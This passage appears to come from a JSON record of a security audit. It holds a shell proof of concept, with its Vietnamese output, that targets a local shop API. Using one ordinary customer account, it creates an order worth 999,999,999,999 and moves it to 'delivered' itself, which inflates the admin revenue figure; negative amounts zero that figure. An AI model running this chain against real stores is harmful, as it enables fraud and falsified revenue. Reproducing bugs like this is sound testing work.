\"${H[@]}\" -d \"{\\\"status\\\":\\\"$s\\\"}\"; done\nprintf '     doanh thu sau do = '\ncurl -s localhost:3000/api/admin/orders -H \"Authorization: Bearer $AT\" | jq '[.[] | select(.status==\"delivered\") | .total_amount] | add'",
+          "out": "Chuoi khai thac chi dung MOT tai khoan khach binh thuong:\n  1. tu khai don tri gia 999.999.999.999 (BUG-A2-01) -> don 1\n  2. tu day don sang delivered (BUG-A3-01) -> delivered\n  3. FR-13 doanh thu = tong total_amount cac don delivered = 999999999999\n\n  ... va so am cung duoc:\n     doanh thu sau do = 0\n"
         }
       ]
     }
